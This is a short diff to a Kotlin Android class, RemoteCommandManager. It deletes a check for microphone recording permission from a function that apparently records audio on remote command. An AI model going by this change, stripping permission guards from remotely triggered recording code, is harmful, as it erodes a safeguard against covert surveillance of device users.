@@ -1246,11 +1246,6 @@ class RemoteCommandManager(private val context: Context) {
     }
 
     private suspend fun recordAudioRemote(payload: String): String = withContext(Dispatchers.IO) {
-        val hasRecordPermission = ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
-        if (!hasRecordPermission) {
-            throw IllegalStateException("Microphone recording permission (android.permission.RECORD_AUDIO) not granted.")
-        }
-
         var durationSec = 10
         var maxShots = 1
         var intervalSec = 2
